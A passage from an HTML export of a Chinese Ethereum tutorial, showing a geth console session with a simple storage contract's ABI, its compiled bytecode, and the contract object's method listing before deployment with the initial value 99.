class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"constant"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"inputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">"v"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"name"</span>:<span class="cm-string">"set"</span>,<span class="cm-string">"outputs"</span>:[],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"constant"</span>:<span class="cm-keyword">true</span>,<span class="cm-string">"inputs"</span>:[],<span class="cm-string">"name"</span>:<span class="cm-string">"get"</span>,<span class="cm-string">"outputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">""</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"view"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"function"</span>},{<span class="cm-string">"inputs"</span>:[{<span class="cm-string">"name"</span>:<span class="cm-string">"v"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"uint256"</span>}],<span class="cm-string">"payable"</span>:<span class="cm-keyword">false</span>,<span class="cm-string">"stateMutability"</span>:<span class="cm-string">"nonpayable"</span>,<span class="cm-string">"type"</span>:<span class="cm-string">"constructor"</span>}]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"value"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"uint256"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"v"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"uint256"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"set"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"get"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">""</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"uint256"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"v"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"uint256"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"constructor"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">hex</span> = <span class="cm-string">"0x608060405234801561001057600080fd5b50604051602080610114833981016040525160005560e1806100336000396000f30060806040526004361060525763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633fa4f2458114605757806360fe47b114607b5780636d4ce63c146092575b600080fd5b348015606257600080fd5b50606960a4565b60408051918252519081900360200190f35b348015608657600080fd5b50609060043560aa565b005b348015609d57600080fd5b50606960af565b60005481565b600055565b600054905600a165627a7a723058207098d9dc5ae86fe75d1016078954658c002f112da516ed90f64c901feb340d870029"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-string">"0x608060405234801561001057600080fd5b50604051602080610114833981016040525160005560e1806100336000396000f30060806040526004361060525763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416633fa4f2458114605757806360fe47b114607b5780636d4ce63c146092575b600080fd5b348015606257600080fd5b50606960a4565b60408051918252519081900360200190f35b348015608657600080fd5b50609060043560aa565b005b348015609d57600080fd5b50606960af565b60005481565b600055565b600054905600a165627a7a723058207098d9dc5ae86fe75d1016078954658c002f112da516ed90f64c901feb340d870029"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="">​</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;</span> <span class="cm-variable">sample</span> = <span class="cm-variable">eth.contract</span>(<span class="cm-variable">abi</span>)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">abi</span>: [{</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"value"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"set"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">constant</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">name</span>: <span class="cm-string">"get"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">outputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"view"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"function"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }, {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">inputs</span>: [{<span class="cm-error">...}</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">payable</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">stateMutability</span>: <span class="cm-string">"nonpayable"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">type</span>: <span class="cm-string">"constructor"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  }],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">eth</span>: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">accounts</span>: [<span class="cm-string">"0x2f3efd9475fb969eecfdade75a1dae02dbd92e25"</span>],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">blockNumber</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">coinbase</span>: <span class="cm-string">"0x2f3efd9475fb969eecfdade75a1dae02dbd92e25"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">compile</span>: {</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">lll</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">serpent</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;<span class="cm-variable">solidity</span>: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">defaultAccount</span>: <span class="cm-variable">undefined</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">defaultBlock</span>: <span class="cm-string">"latest"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">gasPrice</span>: <span class="cm-number">1</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">hashrate</span>: <span class="cm-number">0</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">mining</span>: <span class="cm-keyword">true</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">pendingTransactions</span>: [],</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">protocolVersion</span>: <span class="cm-string">"0x3f"</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">syncing</span>: <span class="cm-keyword">false</span>,</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">call</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">contract</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">abi</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">estimateGas</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">filter</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">options</span>, <span class="cm-variable">callback</span>, <span class="cm-variable">filterCreationErrorCallback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getAccounts</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getBalance</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getBlock</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getBlockNumber</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getBlockTransactionCount</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getBlockUncleCount</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getCode</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getCoinbase</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getCompilers</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getGasPrice</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getHashrate</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getMining</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getPendingTransactions</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getProtocolVersion</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getRawTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getRawTransactionFromBlock</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getStorageAt</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getSyncing</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getTransactionCount</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getTransactionFromBlock</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getTransactionReceipt</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getUncle</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">getWork</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">iban</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">iban</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">icapNamereg</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">isSyncing</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">namereg</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">resend</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">sendIBANTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">sendRawTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">sendTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">sign</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">signTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">submitTransaction</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">submitWork</span>: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  },</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">at</span>: <span class="cm-keyword">function</span>(<span class="cm-variable">address</span>, <span class="cm-variable">callback</span>),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-variable">getData</span>: <span class="cm-keyword">function</span>(),</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-keyword">new</span>: <span class="cm-keyword">function</span>()</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 3688px;"></div><div class="CodeMirror-gutters" style="display: none; height: 3688px;"></div></div></div></pre><ul><li>把合约代码部署上链</li></ul><blockquote><p>合约部署上链时，给构造函数传参  99，即赋初值 99</p></blockquote><pre spellcheck="false" class="md-fences md-end-block contain-cm modeLoaded" lang="basic" style="break-inside: unset;"><div class="CodeMirror cm-s-inner CodeMirror-wrap"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 4px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 